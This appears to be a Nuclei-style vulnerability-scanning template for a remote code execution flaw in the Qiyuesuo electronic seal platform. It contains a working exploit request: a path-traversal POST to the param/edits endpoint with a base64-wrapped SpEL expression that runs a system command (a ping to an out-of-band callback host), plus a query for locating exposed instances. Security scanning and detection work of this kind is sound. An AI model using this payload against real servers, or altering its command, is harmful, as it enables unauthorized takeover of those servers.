http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  raw:
  - 'POST /contract/ukeysign/.%2e/.%2e/template/param/edits HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Content-Length: 32990


    {"id":"2","params":[{"expression":"var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var
    b=''{{base64_payload}}'';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),''UTF-8'');var
    c=a.parseExpression(deStr);c.getValue();"}]}

    '
id: qiyuesuo-param-edits-rce
info:
  author: Co5mos
  description: 'Qiyuesuo Electronic Seal Platform''s `param/edits` endpoint has a
    remote command execution vulnerability that allows attackers to execute arbitrary
    code on the server, potentially gaining full control over the web server.

    '
  metadata:
    fofa-query: "app=\"\u5951\u7EA6\u9501-\u7535\u5B50\u7B7E\u7F72\u5E73\u53F0\""
  name: Qiyuesuo Electronic Seal Platform param/edits RCE
  reference:
  - https://1oecho.github.io/oYmYrVh51/
  severity: critical
  tags: qiyuesuo, rce
variables:
  base64_payload: '{{base64(payload)}}'
  payload: T(java.lang.Runtime).getRuntime().exec('ping {{interactsh-url}}')
